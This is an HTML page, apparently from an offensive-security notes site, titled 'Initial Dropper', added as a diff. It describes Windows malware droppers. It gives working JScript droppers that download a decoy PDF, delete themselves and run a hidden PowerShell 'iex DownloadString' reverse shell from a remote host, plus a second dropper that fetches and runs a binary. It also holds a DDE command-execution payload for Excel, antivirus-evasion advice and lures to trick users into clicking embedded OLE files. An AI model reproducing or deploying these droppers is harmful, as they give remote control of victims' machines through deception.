@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Initial Dropper - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Executing in memory (Fileless)", url: "#_top", children: [
+              {title: "Powershell / WMI / ADODB.Stream", url: "#powershell-wmi-adodbstream" },
+          ]},
+          {title: "JScript / JS", url: "#jscript-js", children: [
+              {title: "HTA", url: "#hta" },
+              {title: "Registry file", url: "#registry-file" },
+              {title: "Insert malicious file (OLE Object) into Word", url: "#insert-malicious-file-ole-object-into-word" },
+              {title: "Dynamic Data Exchange - DDE", url: "#dynamic-data-exchange-dde" },
+          ]},
+          {title: "Download and execute your second stage payload", url: "#download-and-execute-your-second-stage-payload", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../reverse_shell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../reverse_shell/" class="btn btn-xs btn-link">
+        Generate Payload - Reverse shells
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../initial_access/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../initial_access/" class="btn btn-xs btn-link">
+        Initial Access
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <p>A dropper never contains the actual payload. It is only the first stage which downloads the actual payload. For windows it can take many different forms, or written in different languages etc. Here are a few.</p>
+<table>
+<thead>
+<tr>
+<th align="left">No.</th>
+<th align="center">Dropper type</th>
+<th align="left">File extension</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"></td>
+<td align="center"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="center">JScript</td>
+<td align="left">.js/.jse</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="center">VBScript</td>
+<td align="left">.vbs/.vbe</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="center">Windows Script File</td>
+<td align="left">.wsf</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="center">HTML Application</td>
+<td align="left">.hta</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="center">Compiled HTML Help</td>
+<td align="left">.chm</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="center">Batch file</td>
+<td align="left">.bat</td>
+</tr>
+<tr>
+<td align="left">7</td>
+<td align="center">Shortcut</td>
+<td align="left">.lnk</td>
+</tr>
+<tr>
+<td align="left">8</td>
+<td align="center">Office Word/Excel</td>
+<td align="left">.doc/.docm/.xls/...</td>
+</tr>
+<tr>
+<td align="left">9</td>
+<td align="center">Registry file</td>
+<td align="left">.reg</td>
+</tr>
+<tr>
+<td align="left">10</td>
+<td align="center">Executable</td>
+<td align="left">.exe</td>
+</tr>
+<tr>
+<td align="left">11</td>
+<td align="center">Screensaver file</td>
+<td align="left">.scr</td>
+</tr>
+<tr>
+<td align="left">12</td>
+<td align="center">Program Information File</td>
+<td align="left">.pif</td>
+</tr>
+<tr>
+<td align="left">13</td>
+<td align="center">Installer Package</td>
+<td align="left">.msi</td>
+</tr>
+<tr>
+<td align="left">14</td>
+<td align="center">Java Archive</td>
+<td align="left">.jar</td>
+</tr>
+<tr>
+<td align="left">15</td>
+<td align="center">Troubleshooting pack cabinet</td>
+<td align="left">.diagcab</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="center"></td>
+<td align="left"></td>
+</tr>
+</tbody>
+</table>
+<p>What we want to do here is really easy. We want to download the payload and then execute it. That is all.</p>
+<p>However, we have a few requirements.
+1. It needs to communicate over HTTPS.
+2. It should not write anything to disk (except for the dropper of course).
+3. It should download a fake document, and open it.</p>
+<h2 id="executing-in-memory-fileless">Executing in memory (Fileless)<a class="headerlink" href="#executing-in-memory-fileless" title="Permanent link">#</a></h2>
+<p>So before we go in to start developing our dropper in different languages we need to look at the different ways to execute code in memory.</p>
+<h3 id="powershell-wmi-adodbstream">Powershell / WMI / ADODB.Stream<a class="headerlink" href="#powershell-wmi-adodbstream" title="Permanent link">#</a></h3>
+<p>This is probably the most common way. </p>
+<p>There are a few flags that can be used to make the powershell command a bit more stealthy.
+https://securityaffairs.co/wordpress/65570/hacking/powershell-attacks.html
+https://www.reddit.com/r/PowerShell/comments/8qsndn/sneaky_powershell_trick_run_completely_without_a/</p>
+<p>With Powershell there are mainly three ways to download files.</p>
+<h4 id="invoke-webrequest">Invoke webrequest<a class="headerlink" href="#invoke-webrequest" title="Permanent link">#</a></h4>
+<pre><code>Invoke-WebRequest
+
+
+$url = &quot;http://mirror.internode.on.net/pub/test/10meg.test&quot;
+$output = &quot;$PSScriptRoot\10meg.test&quot;
+$start_time = Get-Date
+
+Invoke-WebRequest -Uri $url -OutFile $output
+Write-Output &quot;Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)&quot;
+</code></pre>
+
+<h4 id="systemnetwebclient">System.Net.WebClient<a class="headerlink" href="#systemnetwebclient" title="Permanent link">#</a></h4>
+<p>This is a .Net class that you can use straight from powershell.</p>
+<pre><code>(New-Object System.Net.WebClient).DownloadFile($url, $output)
+
+</code></pre>
+
+<h4 id="start-bitstransfer">Start-BitsTransfer<a class="headerlink" href="#start-bitstransfer" title="Permanent link">#</a></h4>
+<pre><code>start-bitstransfer -source http://192.168.66.87/apaa.txt -destination test2.txt
+
+</code></pre>
+
+<h4 id="copy-item-smb">Copy-item (SMB)<a class="headerlink" href="#copy-item-smb" title="Permanent link">#</a></h4>
+<pre><code>Copy-Item -Source \\server\share\file -Destination C:\path\
+
+</code></pre>
+
+<h2 id="jscript-js">JScript / JS<a class="headerlink" href="#jscript-js" title="Permanent link">#</a></h2>
+<p>JScript and VBScript are supported nativly in Windows. When clicked on they are executed by <code>wscript.exe</code>.</p>
+<p>When a <code>.js</code> file is clicked on in a windows machine that script is executed by wscript.exe.
+Using a <code>.js</code> file might be beneficial because its icon looks like a text-document.</p>
+<p>This is an example of a dropper that will do the following:
+1. Download a clean PDF document. 
+2. Open the document
+3. Remove itself
+4. Download an run the actual payload</p>
+<pre><code class="javascript">// Name of file: Interestingfile.js
+// Download clean-document
+command = &quot;powershell.exe -exec bypass -Windowstyle Hidden -command \&quot;start-bitstransfer -source http://192.168.66.87/Interestingfile.pdf -destination Interestingfile.pdf\&quot;&quot;;
+shell = new ActiveXObject(&quot;WScript.Shell&quot;).Run(command,0,true);
+
+// Sleep a bit to make sure the document is downloaded
+WScript.Sleep(3000);
+
+// Open the document
+var shell = WScript.CreateObject(&quot;WScript.Shell&quot;);
+shell.Run(&quot;Interestingfile.pdf&quot;);
+
+// Remove the dropper-file
+command = &quot;powershell.exe -exec bypass -Windowstyle Hidden -command \&quot;rm Interestingfile.js\&quot;&quot;;
+shell = new ActiveXObject(&quot;WScript.Shell&quot;).Run(command,0,true);
+
+// Launche the reverse shell
+command = &quot;powershell.exe -exec bypass -Windowstyle Hidden -noexit -command \&quot;iex (New-Object Net.WebClient).DownloadString('http://192.168.66.87/shell_reverse.ps1')\&quot;&quot;;
+shell = new ActiveXObject(&quot;WScript.Shell&quot;).Run(command,0,true);
+</code></pre>
+
+<p>Not so fileless. This is another fun technique, however it writes to disk, so make sure that your malivious code is not of-the-shelf or it will be spotted by anti-virus.</p>
+<pre><code class="javascript">var myActXobj = this[&quot;ActiveXObject&quot;];
+var myShell = new myActXobj(&quot;WScript.Shell&quot;);
+var myHTTP = new myActXobj(&quot;MSXML2.XMLHTTP&quot;);
+var myTempPath = myShell[&quot;ExpandEnvironmentStrings&quot;](&quot;%TEMP%&quot;);
+
+function dropperFunc(myURL, exeName) {
+    var myPath = myTempPath + &quot;/&quot; + exeName + &quot;.exe&quot;;
+    myHTTP[&quot;open&quot;](&quot;GET&quot;, myURL, false);
+    myHTTP[&quot;send&quot;]();
+    if (myHTTP.status == 200) {
+    var myStream = new myActXobj(&quot;ADODB.Stream&quot;);
+        myStream[&quot;open&quot;]();
+        myStream.type = 1;
+        myStream[&quot;write&quot;](myHTTP[&quot;ResponseBody&quot;]);
+        myStream[&quot;position&quot;] = 0;
+        myStream[&quot;saveToFile&quot;](myPath, 2);
+        myStream.close();
+        myShell[&quot;Run&quot;](myPath, 1, 0); 
+    }
+}
+dropperFunc(&quot;hxxx://mittmalware[.]com/mal.bin&quot;,&quot;CGvMIoL&quot;);
+</code></pre>
+
+<h3 id="hta">HTA<a class="headerlink" href="#hta" title="Permanent link">#</a></h3>
+<p>A .hta-file is basically just an HTML file. But when it is executed the javascript inside it has access to ActiveXObjects so it can execute anything on the machien.</p>
+<p>.HTA files are more prone to be considered malware though.</p>
+<pre><code class="html">&lt;html&gt;
+  &lt;head&gt;
+    &lt;script language=&quot;VBscript&quot;&gt;
+    But your VBScript or JScript here
+    &lt;/script&gt;
+  &lt;/head&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h3 id="registry-file">Registry file<a class="headerlink" href="#registry-file" title="Permanent link">#</a></h3>
+<h3 id="insert-malicious-file-ole-object-into-word">Insert malicious file (OLE Object) into Word<a class="headerlink" href="#insert-malicious-file-ole-object-into-word" title="Permanent link">#</a></h3>
+<p>OLE stands for Object Linking and Embedding.</p>
+<p>You can embed different types of files into a Word file. Common OLE objects are JavaScript, VBScript or EXE files.</p>
+<p>Open up a word document.
+Go to <code>Insert &gt; Text &gt; Object &gt; Create New &gt; Package &gt; Browse to your malicious javascript-file</code>.</p>
+<p>The user must click on the file for it to be executed.
+For this there are a few different techniques in use. It might be to make the icon huge, and then ask the user to click it to decrypt the text ot something like that.</p>
+<p>It can also be to ask the user to click on the file to prove you are not a robot.</p>
+<h3 id="dynamic-data-exchange-dde">Dynamic Data Exchange - DDE<a class="headerlink" href="#dynamic-data-exchange-dde" title="Permanent link">#</a></h3>
+<p>Using DDE it is possible to execute commands from within Word or Excel.
+Microsoft patched the possiblility to execute DDE:s from word. </p>
+<p>In latest Microsoft Excel 365 (2019) you need to go to  <code>File / Options / Trust Center / Trust Center Settings / Enable Dynamic Data Exchange Server Launch</code> for it to work.</p>
+<p>You can execute commands like this:</p>
+<pre><code>=cmd| '/c cmd.exe'!A1
+</code></pre>
+
+<p>If you want to run more complicated commands that require multiple quotationmarks you can encode your payload with base64. It appreas that it needs to be </p>
+<pre><code> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-ChildItem'))
+</code></pre>
+
+<h2 id="download-and-execute-your-second-stage-payload">Download and execute your second stage payload<a class="headerlink" href="#download-and-execute-your-second-stage-payload" title="Permanent link">#</a></h2>
+<p>So, if you get your user to execute a <code>.js</code> file, DDE, EXE or any other type, you want to download your real code.
+There are some things you want with this. You do not want to write your second stage payload to disk, as that increase the risk of it being detected by anti-virus.
+So you want to run your code straight into memory if you can.</p>
+<p>https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../reverse_shell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../reverse_shell/" class="btn btn-xs btn-link">
+        Generate Payload - Reverse shells
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../initial_access/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../initial_access/" class="btn btn-xs btn-link">
+        Initial Access
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/initial_access/initial_access_dropper.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
